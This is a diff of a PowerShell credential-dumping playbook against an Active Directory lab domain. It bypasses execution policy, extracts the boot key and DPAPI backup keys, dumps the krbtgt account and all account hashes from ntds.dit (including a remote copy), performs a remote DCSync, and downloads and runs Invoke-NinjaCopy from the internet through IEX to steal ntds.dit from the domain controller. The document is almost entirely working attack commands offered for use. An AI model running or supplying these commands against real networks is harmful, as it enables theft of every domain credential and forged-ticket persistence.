@@ -3,7 +3,7 @@
 #
 
 #
-# Housecleaning first, and run PowerShell as admin whereever you have admin privs. 
+# Housecleaning first
 #
 
 powershell -ep bypass
@@ -69,10 +69,28 @@ Get-ADDBBackupKey -DBPath 'C:\temp\ntds.dit' -BootKey 9717c36de43e1a51d9bd57533f
 Get-ADReplBackupKey -Domain 'labs.local' -Server dc01 Save-DPAPIBlob -DirectoryPath c:\temp\keys\
 
 #
+# grab krbtgt while at it
+#
+
+$key = Get-BootKey -SystemHivePath 'C:\temp\system.hive'
+Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=labs,DC=local' -DBPath 'C:\temp\ntds.dit' -BootKey $key
+
+# 
+# decrypt all the things from the remote IFM instantiated copy of ntds.dit
+#
+
+Get-ADDBAccount -All -DBPath '\\dc01\c$\ifm\Active Directory\ntds.dit' -BootKey $key 
+
+#
+# This one will perform a remote dcsync -- note, this one will DUMP the sync to stdout
+#
+
+Get-ADReplAccount -All -Server dc01 -NamingContext "dc=labs,dc=local" 
+
+#
 # use ninja-copy to recover ntds.dit
 # which is likely broken, lots of issues with the retrieval (copy \\unc\file via PS works tho)
 #
 
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1')
 Invoke-NinjaCopy -Path “c:\windows\ntds\ntds.dit” -ComputerName "dc01" -LocalDestination “c:\temp\ntds.dit”
-
